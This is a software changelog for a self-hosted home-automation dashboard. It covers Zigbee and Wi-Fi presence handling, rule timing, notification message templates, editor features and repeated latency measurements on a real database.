2.63.0 — fourth latency pass. The API listener's backlog is 64 instead of
the default 5, so a page opening with a dozen requests on top of the parked
long polls no longer has connections dropped and retried a second later. A
presence rule's quick look at the Wi-Fi never waits behind a regular poll
stuck on a slow controller (it takes the lock for its own 3 s at most, then
goes with the last answer). *Must hold for N s* rules are finished on the
presence worker rather than the clock thread, and the clock beats every
half second. After the daemon comes back, the page's live wait retries at
once instead of after its backoff. Soak on the real database unchanged:
wake-up median 1.3 ms, status 6.7 ms, 3 % of one core.

2.62.2 — the *why out* explanation sits on its own line under the person
(it was crammed into the 54 px tag column) and reads more plainly.

2.62.1 — a person's device can be matched by the name the controller shows
(`name:iPhone16`) instead of a Wi-Fi address that rotates; every *out* tag
and the At home dialog say in words why the person counts as out.

2.62.0 — presence-gated rules look at the Wi-Fi *now* before firing: an
answer older than `presence_fresh_s` (4 s) is refreshed with a 3 s timeout,
so arriving is seen before the first motion alert. Rules are evaluated on
their own ordered thread (hand-over from the broker thread in microseconds),
so that wait never touches a button, a report or a plug. The controller can
now be asked as often as every 3 s (was 10).

2.61.0 — third latency pass, with a 60-second soak on the real database
(five reports a second with a browser-style long-poll client): wake-up
median 1.0 ms, p95 1.5 ms, max 1.8 ms; `/api/status` 5.5 ms; 1.9 % of one
core; no memory growth. Two things were found and fixed. *Must hold for
N s* rules and weekly schedules were checked from the plug poll loop every
30 s, so "no motion for 10 min" fired anywhere up to half a minute late and
a slow plug round pushed a 07:00 schedule to 07:01 — they now beat on their
own one-second thread (a 3 s rule fires at 3.0 s), and that thread runs
even with no plug configured, where before a house with only Zigbee
switches got no schedules at all. Notifications that sat in the queue for
five minutes (internet down) are dropped with a log line instead of
arriving as stale news, critical ones excepted.

2.60.3 — the coordinator is no longer shown as offline while it is plainly
running. Zigbee2MQTT marks it offline because it does not answer the
availability pings an end device answers, and that word used to stand even
when the box was answering on its own network API a second earlier. A
gateway that answers now vouches for its device: the bridge's *offline* is
ignored while its own API is replying, and counts again three poll rounds
after it stops.

2.60.2 — the Overview metric cards open the same detail dialog *Needs
attention* has: **Online** lists what is and is not reporting with why and
how long ago, **At home** each watched person with how they are known and
the state of the controller, **Devices** everything grouped by kind. A name
in any of them opens that device's History, as before.

2.60.1 — *By hand* works through scenes and sequences: the hold used to be
looked for on the scene itself, where no rule ever looks, so a PIR rule
switched the lights off again a minute after the button had set the scene.
Each light the scene touches is now held (or released) on its own.

2.60.0 — a second latency pass, measured on a real 4-day database. Every
message type costs under 4 ms on the broker thread (a device list 2 ms, a
PIR event with its rule 2.9 ms, a button with its binding 3.9 ms); the
message path, the wake-up and `/api/status` (1.7 ms warm) never wait for
the store lock, so a VACUUM or a backup stalls charts only, never a press.
On the page: the Overview rebuilds only the card whose facts changed (one
report used to rebuild all of them and restart every animation); a burst
of reports — twenty in 80 ms — becomes one status fetch instead of twenty,
with the first change still fetched at once; the broker keepalive is 20 s
and reconnects start after 1 s, so a dead link is noticed in ~30 s rather
than 90 and picked up again in a second.

2.59.4 — the Emoji and Facts pop-ups are wide and low (720 / 860 px,
capped at 70 % of the window and scrolling inside) instead of a 330 px
column; Facts lays its items out in a grid with the description beside
each placeholder; both open above the button when there is no room below.

2.59.3 — Ctrl+Space (and moving through the completion list) no longer
scrolls the page: the list scrolls itself, focus is restored without
scrolling, and when there is no room under the caret the list opens above
it.

2.59.2 — the live preview under every message is back and drawn as the
phone will show it (app, title, text, picture line), refreshed a beat
after each keystroke and after a level/picture change. It used to need an
unlocked session because it went through the PIN-guarded save endpoint;
it now has its own read-only `/api/message-preview`, so it shows locked or
not. The Emoji button offers seven groups (~180 symbols) instead of four.

2.59.1 — IDE-style completion in the message editor: `{` or Ctrl+Space
lists every fact with a description and a live example, a device name and
`.` lists that device's readings with their current values; the Facts
button carries the same catalogue with examples.

2.59.0 — messages know more: `{unit}`, `{label}`, `{model}`, `{battery}`,
`{signal}`, `{temperature}`, `{humidity}` of the device that set it off;
`{weekday}`, `{sunrise}`, `{sunset}`, `{daylight}`, `{home_count}`,
`{attention}`, `{attention_list}`, `{alerts}`, `{uptime}`; and
`{Name.key}` for the current reading of any device at all (`{Name.state}`,
`{Name.age}`, `{Name.battery}` …). The Facts picker lists them.

2.58.2 — Zigbee gateways editor: the Detect/Remove buttons sat in a fixed
104 px cell and hung out past the card; the cell now takes what they need,
the other columns may shrink, and on a narrower window the buttons wrap under
the row instead of overflowing. The *config.json* tag rides with them
rather than becoming a stray seventh cell.

2.58.1 — verified against a real 4-day database (35 devices, 15 plugs, 3
gateways, 11 bindings, 6 rules): a report, a button press with its binding
and a PIR event with its rule each wake the dashboard in 2–7 ms while every
plug is unreachable; `/api/status` builds in 9 ms. Its 140 kB of JSON is now
gzip-compressed by nginx (~15 kB on the wire; `--upgrade` adds the directive
to an existing server block).

2.58.0 — the *may be unplugged* device state; and a pass over latency:
the Overview charts load in one request (`/api/history-multi`) and, on a
live update, at most once every 15 s instead of once per message from any
device — the cards themselves still repaint the instant a report lands;
history is thinned inside SQLite (a 7-day series takes ~8 ms instead of
~40 ms of lock time per device); the systemd unit no longer caps the
daemon at 15 % CPU with idle I/O, which had been stretching sub-second
work into seconds whenever the machine was busy; a plug's MQTT push of new
watts wakes the dashboard at once; the plug poll period counts from the
start of a round, so one dead box no longer delays the others or the
schedules; a multi-relay strip now records *contact restored* and wakes the
dashboard when it comes back.
